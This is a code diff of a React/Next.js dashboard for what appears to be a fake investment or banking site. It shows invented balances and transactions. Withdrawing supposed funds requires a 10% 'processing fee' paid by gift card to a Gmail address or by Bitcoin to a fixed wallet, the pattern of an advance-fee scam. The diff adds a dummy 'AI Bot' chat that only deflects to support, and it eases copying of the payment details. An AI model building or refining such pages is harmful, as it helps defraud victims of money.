@@ -1,5 +1,5 @@
 'use client';
-import { useEffect, useState } from 'react';
+import { useEffect, useState, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import Footer from '@/components/Footer';
 import Confetti from 'react-confetti';
@@ -36,6 +36,9 @@ export default function DashboardPage() {
   const [showOnlineBankModal, setShowOnlineBankModal] = useState(false);
   const [showPrepaidCardModal, setShowPrepaidCardModal] = useState(false);
   const [showCashAppModal, setShowCashAppModal] = useState(false);
+  const [showChatBot, setShowChatBot] = useState(false);
+  const [chatMessages, setChatMessages] = useState([]);
+  const [interactionCount, setInteractionCount] = useState(0);
 
   const banks = [
     'JPMorgan Chase',
@@ -120,7 +123,7 @@ export default function DashboardPage() {
     { type: 'Wired Check', amount: 110000, date: 'Dec 15, 2023', status: 'Completed', source: 'Google' },
   ]);
 
-  
+  const inputRef = useRef(null);
 
   useEffect(() => {
     // Check if user is logged in
@@ -247,7 +250,7 @@ export default function DashboardPage() {
   };
 
   const handlePaymentConfirmation = () => {
-    if (!hasCopiedDetails) {
+    if (!hasCopiedDetails && window.getSelection().toString() === '') {
       setShowWarning(true);
       return;
     }
@@ -271,6 +274,18 @@ export default function DashboardPage() {
       setShowPrepaidCardModal(true);
     }
     // Add logic for other options if needed
+  };
+
+  const handleSendMessage = () => {
+    const userMessage = inputRef.current.value;
+    if (userMessage.trim() !== '') {
+      setChatMessages([...chatMessages, `User: ${userMessage}`, "Chatbot: Please contact support for further assistance."]);
+      inputRef.current.value = '';
+      setInteractionCount(interactionCount + 1);
+      if (interactionCount >= 2) {
+        setInteractionCount(0); // Reset interaction count after two responses
+      }
+    }
   };
 
   return (
@@ -465,10 +480,10 @@ export default function DashboardPage() {
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
           <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
             <div className="flex justify-between items-center mb-4">
-              <h2 className="text-xl font-semibold text-yellow-500">Transfer to Online Bank</h2>
               <button 
                 onClick={() => {
                   setShowOnlineBankModal(false);
+                  setShowTransferOptionsModal(true);
                   setShowBalanceWarning(false);
                 }}
                 className="text-white hover:text-yellow-500"
@@ -483,7 +498,7 @@ export default function DashboardPage() {
                     strokeLinecap="round" 
                     strokeLinejoin="round" 
                     strokeWidth={2} 
-                    d="M6 18L18 6M6 6l12 12" 
+                    d="M15 19l-7-7 7-7" 
                   />
                 </svg>
               </button>
@@ -578,15 +593,17 @@ export default function DashboardPage() {
         </div>
       )}
 
-      {/* Prepaid Card Transfer Modal */}
-      {showPrepaidCardModal && (
+     
+
+      {/* CashApp Transfer Modal */}
+      {showCashAppModal && (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
           <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
             <div className="flex justify-between items-center mb-4">
-              <h2 className="text-xl font-semibold text-yellow-500">Transfer to Prepaid Card</h2>
               <button 
                 onClick={() => {
-                  setShowPrepaidCardModal(false);
+                  setShowCashAppModal(false);
+                  setShowTransferOptionsModal(true);
                   setShowBalanceWarning(false);
                 }}
                 className="text-white hover:text-yellow-500"
@@ -601,122 +618,7 @@ export default function DashboardPage() {
                     strokeLinecap="round" 
                     strokeLinejoin="round" 
                     strokeWidth={2} 
-                    d="M6 18L18 6M6 6l12 12" 
-                  />
-                </svg>
-              </button>
-            </div>
-            <form onSubmit={handleTransferSubmit} className="space-y-4">
-              <div>
-                <label className="block text-gray-200 mb-2">Select Card Provider</label>
-                <select
-                  value={transferForm.bank}
-                  onChange={(e) => setTransferForm({ ...transferForm, bank: e.target.value })}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
-                  required
-                >
-                  <option value="">Select a card provider</option>
-                  {prepaidCardProviders.map((provider) => (
-                    <option key={provider} value={provider} className="bg-black text-white">
-                      {provider}
-                    </option>
-                  ))}
-                </select>
-              </div>
-              <div>
-                <label className="block text-gray-200 mb-2">Account Name</label>
-                <input
-                  type="text"
-                  name="accountName"
-                  value={transferForm.accountName}
-                  onChange={handleInputChange}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
-                  placeholder="Enter account name"
-                  required
-                  pattern="[a-zA-Z\s]*"
-                  title="Only letters and spaces are allowed"
-                />
-              </div>
-              <div>
-                <label className="block text-gray-200 mb-2">Account Number</label>
-                <input
-                  type="text"
-                  name="accountNumber"
-                  value={transferForm.accountNumber}
-                  onChange={handleInputChange}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
-                  placeholder="Enter account number (10-12 digits)"
-                  required
-                  pattern="\d{10,12}"
-                  title="Only numbers are allowed (10-12 digits)"
-                  maxLength="12"
-                />
-              </div>
-              <div>
-                <label className="block text-gray-200 mb-2">Routing Number</label>
-                <input
-                  type="text"
-                  name="routingNumber"
-                  value={transferForm.routingNumber}
-                  onChange={handleInputChange}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
-                  placeholder="Enter routing number (9 digits)"
-                  required
-                  pattern="\d{9}"
-                  title="Only numbers are allowed (9 digits)"
-                  maxLength="9"
-                />
-              </div>
-              <div>
-                <label className="block text-gray-200 mb-2">Amount</label>
-                <input
-                  type="text"
-                  name="amount"
-                  value={transferForm.amount}
-                  onChange={handleInputChange}
-                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
-                  placeholder="Enter amount"
-                  required
-                  pattern="\d*\.?\d{0,2}"
-                  title="Only numbers and up to 2 decimal places are allowed"
-                />
-                {showBalanceWarning && (
-                  <p className="text-red-500 text-sm mt-1">Amount exceeds your current balance of {totalBalance}</p>
-                )}
-              </div>
-              <button
-                type="submit"
-                className="w-full bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
-                disabled={showBalanceWarning}
-              >
-                Transfer
-              </button>
-            </form>
-          </div>
-        </div>
-      )}
-
-      {/* CashApp Transfer Modal */}
-      {showCashAppModal && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
-          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
-            <div className="flex justify-between items-center mb-4">
-              <h2 className="text-xl font-semibold text-yellow-500">Transfer to CashApp</h2>
-              <button 
-                onClick={() => setShowCashAppModal(false)}
-                className="text-white hover:text-yellow-500"
-              >
-                <svg 
-                  className="w-6 h-6" 
-                  fill="none" 
-                  stroke="currentColor" 
-                  viewBox="0 0 24 24"
-                >
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M6 18L18 6M6 6l12 12" 
+                    d="M15 19l-7-7 7-7" 
                   />
                 </svg>
               </button>
@@ -768,10 +670,10 @@ export default function DashboardPage() {
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
           <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
             <div className="flex justify-between items-center mb-4">
-              <h2 className="text-xl font-semibold text-yellow-500">Transfer Money</h2>
               <button 
                 onClick={() => {
                   setShowTransferModal(false);
+                  setShowTransferOptionsModal(true);
                   setShowBalanceWarning(false);
                 }}
                 className="text-white hover:text-yellow-500"
@@ -786,7 +688,7 @@ export default function DashboardPage() {
                     strokeLinecap="round" 
                     strokeLinejoin="round" 
                     strokeWidth={2} 
-                    d="M6 18L18 6M6 6l12 12" 
+                    d="M15 19l-7-7 7-7" 
                   />
                 </svg>
               </button>
@@ -957,7 +859,7 @@ export default function DashboardPage() {
                 <p className="text-gray-200 mb-2 text-yellow-500">Payment Information:</p>
                 <div className="space-y-2">
                   <p className="text-sm text-gray-300">Note: The processing fee is <span className="text-green-500">${calculateFee()}</span> (10%) of your transfer amount and must be paid using one of the payment methods below.</p>
-                  <p className="text-sm text-green-500 text-[12px] mt-2">Your account will be credited within 15 minutes after the processing fee is paid.</p>
+                 
                 </div>
               </div>
               
@@ -979,7 +881,7 @@ export default function DashboardPage() {
                       <p className="text-gray-200 mb-2">Send gift card to:</p>
                       <div className="relative">
                         <div className="flex items-center bg-black/50 rounded">
-                          <code className="flex-1 p-2 text-white text-[12px] break-all text-sm">primecapitalorg@gmail.com</code>
+                          <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">primecapitalorg@gmail.com</code>
                           <button
                             onClick={() => copyToClipboard('primecapitalorg@gmail.com', 'giftcard')}
                             className="p-2 text-yellow-500 hover:text-yellow-400"
@@ -1017,7 +919,7 @@ export default function DashboardPage() {
                       <p className="text-gray-200 mb-2">Send Bitcoin to:</p>
                       <div className="relative">
                         <div className="flex items-center bg-black/50 rounded">
-                          <code className="flex-1 p-2 text-white text-[12px]  break-all text-sm">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
+                          <code className="flex-1 p-2 text-white text-[12px] break-all text-sm select-text">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
                           <button
                             onClick={() => copyToClipboard('bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz', 'bitcoin')}
                             className="p-2 text-yellow-500 hover:text-yellow-400"
@@ -1042,6 +944,81 @@ export default function DashboardPage() {
           </div>
         </div>
       )}
+
+      <div className="fixed bottom-[5px] right-[10px] z-50">
+        <button 
+          onClick={() => {
+            setShowChatBot(!showChatBot);
+            if (!showChatBot) {
+              setChatMessages([]);
+              setInteractionCount(0);
+            }
+          }}
+          className="text-black rounded-full transition-colors duration-300 "
+        >
+          <img 
+            src="/bot.png" 
+            alt="AI Bot" 
+            className="w-[150px]"
+          />
+        </button>
+        {showChatBot && (
+          <div className="bg-white/10 backdrop-blur-sm p-3 text-[13px] rounded-lg shadow-md w-60 absolute bottom-[60px] right-0">
+            <div className="flex justify-between items-center mb-2">
+              <h3 className="text-white font-bold">Prime<span className='text-yellow-500'>Chat</span></h3>
+              <button 
+                onClick={() => setShowChatBot(false)}
+                className="text-white hover:text-yellow-500"
+              >
+                <svg 
+                  className="w-5 h-5" 
+                  fill="none" 
+                  stroke="currentColor" 
+                  viewBox="0 0 24 24"
+                >
+                  <path 
+                    strokeLinecap="round" 
+                    strokeLinejoin="round" 
+                    strokeWidth={2} 
+                    d="M6 18L18 6M6 6l-12 12" 
+                  />
+                </svg>
+              </button>
+            </div>
+            <div className="flex-1 overflow-y-auto">
+              {/* Chat messages will go here */}
+              <div className="text-gray-300 mb-2">Hello! How can I assist you today?</div>
+              {/* Example conversation */}
+
+              {chatMessages.map((msg, index) => (
+                <div key={index} className="text-gray-300 mb-2">{msg}</div>
+              ))}
+            </div>
+            <div className="mt-2">
+              <input 
+                ref={inputRef}
+                type="text" 
+                placeholder="Type your message..." 
+                className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-yellow-500"
+                onKeyDown={(e) => {
+                  if (e.key === 'Enter') {
+                    handleSendMessage();
+                  }
+                }}
+                disabled={interactionCount >= 2}
+              />
+              <div className="flex justify-end mt-2">
+                <button 
+                  onClick={handleSendMessage}
+                  className="bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
+                >
+                  Send
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
 
       <div className="relative z-10 pt-32 px-4 pb-8">
         <div className="max-w-7xl mx-auto">
